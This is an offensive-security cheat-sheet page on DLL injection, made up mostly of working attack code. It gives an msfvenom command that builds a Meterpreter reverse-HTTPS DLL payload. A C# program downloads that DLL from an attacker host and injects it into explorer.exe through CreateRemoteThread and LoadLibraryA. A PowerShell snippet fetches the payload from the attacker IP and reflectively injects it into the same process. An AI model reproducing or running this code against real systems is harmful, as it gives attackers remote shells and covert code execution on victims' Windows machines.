---
layout:     post
author:     0x5c4r3
type: docs
permalink: DLL_Injection
---


<span style="font-size: 35px; color:red"><b>DLL Injection</b></span>
&nbsp;

<span style="font-size: 25px; color:white"><b>C Sharp</b></span>
Load dll library into a running process.

```shell
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=443 -f dll -o /var/www/html/<OUTPUT>.dll
```

This exploit leaves traces tho, downloading the .dll in the local disk.
```cs
sing System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {

            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\<name>.dll"; //change here

            WebClient wc = new WebClient();
            wc.DownloadFile("http://<ATTACKER_IP>/<name>.dll", dllName);

            Process[] expProc = Process.GetProcessesByName("explorer"); //change here
            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr outSize;
            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }
    }
}
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Powershell</b></span>
```shell
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=443 -f dll -o /var/www/html/<OUTPUT>.dll
```

Download and Invoke:
```powershell
$bytes = (New-Object System.Net.WebClient).DownloadData('http://<ATTACKER_IP>/<NAME>.dll')
$procid = (Get-Process -Name explorer).Id
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```
